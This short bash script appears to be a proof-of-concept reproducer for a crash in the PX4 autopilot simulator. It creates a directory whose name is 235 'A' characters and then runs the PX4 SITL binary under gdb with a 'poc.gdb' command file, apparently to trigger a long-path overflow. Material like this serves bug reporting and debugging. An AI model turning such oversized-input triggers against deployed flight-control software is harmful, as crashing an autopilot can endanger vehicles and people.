#!/bin/bash
mkdir tmp
cd tmp
mkdir `perl -e 'print"A"x235'`
mkdir z
cd ..
gdb --batch --command=/poc.gdb --args ./build/px4_sitl_default/bin/px4
/bin/bash

